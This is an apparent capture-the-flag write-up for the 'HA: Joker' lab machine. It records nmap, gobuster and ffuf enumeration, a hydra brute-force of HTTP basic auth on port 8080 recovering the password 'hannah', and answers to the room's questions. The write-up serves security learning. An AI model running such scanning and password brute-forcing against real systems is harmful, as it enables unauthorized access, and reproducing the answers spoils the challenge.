After deplying machine, I used nmap scan to gather infromation about this server

```
nmap -A -sS -sC -v 10.10.249.45

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8080/tcp open  http    Apache httpd 2.4.29
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


```
after nmap scan ti sime questions like:

1. What version of Apache is it?

Answer: **2.4.29**

2. What port on this machine not need to be authenticated by user and password?

Answer: **80**

So i used gobuster in port 80 to get some directories

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.249.25
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.249.25
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.249.25/css/]                                                                    
/img                  (Status: 301) [Size: 310] [--> http://10.10.249.25/img/]                                                                    
/index.html           (Status: 200) [Size: 5954]
/phpinfo.php          (Status: 200) [Size: 94762]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

i run abother directory scan to look for something else

```
└─$ ffuf -u http://10.10.92.30/FUZZ.txt -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.92.30/FUZZ.txt
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 118ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 119ms]
#                       [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 129ms]
# directory-list-lowercase-2.3-small.txt [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 139ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 144ms]
#                       [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 139ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 3444ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 3445ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 3447ms]
#                       [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 4369ms]
# on atleast 3 different hosts [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 4372ms]
#                       [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 4378ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 4383ms]
secret                  [Status: 200, Size: 320, Words: 62, Lines: 7, Duration: 271ms]
```
There is a file on this port that seems to be secret, what is it?
Answer: **secret.txt**

There is another file which reveals information of the backend, what is it?
Answer: **phpinfo.php**

When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?

Answer was mentioned in secret.txt: **joker**

What port on this machine need to be authenticated by Basic Authentication Mechanism?

Answer: **8080**

After i found username i brutforced 8080 port:

```
$ hydra -V -l joker -P /usr/share/wordlists/rockyou.txt -f 10.10.92.30 -s 8080 http-get /

[ATTEMPT] target 10.10.92.30 - login "joker" - pass "chloe" - 927 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "lawrence" - 928 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "xbox360" - 929 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "sheena" - 930 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "murphy" - 931 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "madalina" - 932 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "anamaria" - 933 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "gateway" - 934 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "debbie" - 935 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "yourmom" - 936 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "blonde" - 937 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "jasmine1" - 938 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "please" - 939 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "bubbles1" - 940 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "jimmy" - 941 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "beatriz" - 942 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "poopoo" - 943 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "diamonds" - 944 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "whitney" - 945 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.92.30 - login "joker" - pass "friendship" - 946 of 14344399 [child 14] (0/0)
[8080][http-get] host: 10.10.92.30   login: joker   password: hannah

```
At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

Answer: hannah
